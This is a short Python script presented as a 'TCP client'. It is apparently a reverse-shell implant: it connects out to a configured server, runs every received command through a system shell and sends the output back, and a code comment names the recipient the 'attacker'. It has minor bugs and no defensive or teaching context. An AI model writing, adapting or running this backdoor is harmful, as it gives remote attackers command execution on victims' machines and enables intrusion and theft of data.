import os
import socket
import subprocess
#Client
# TCP Client Code
 
host="0.0.0.0"            # Set the server IP address
port = 33000               # Sets the variable port to 4444
 
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #Create socket
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) #prevents timeouts

sock.connect((host,port))# Connect to server address

print("Connected to Server !!!")
while True: 
    command = sock.recv(1024)# Receives data upto 1024 bytes
    command = command.strip().decode('ascii') 
    print(f"Command from server : {command}")
    
    if command == "quit":
        break
    
    if(command.split()[0] == "cd"):
        if len(command.split()) == 1:
            sock.send(os.getcwd().encode("ascii"))
        elif len(command.split()) == 2:
            try:
                os.chdir(command.split()[1])
                sock.send("Changed directory to :" + os.getcwd())
            except Exception as e:
                print(e)
                sock.send(str.encode("No such directory : " +os.getcwd()))
    else:
        # do shell command
        shell_com = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        # read output
        shell_result = shell_com.stdout.read() + shell_com.stderr.read()
        print(shell_result)
        # send output to attacker
        if(shell_result != ""):
            sock.send(shell_result)
        else:
            sock.send(f" {command} :does not return anything")


sock.close()# Closes the socket 
# End of code


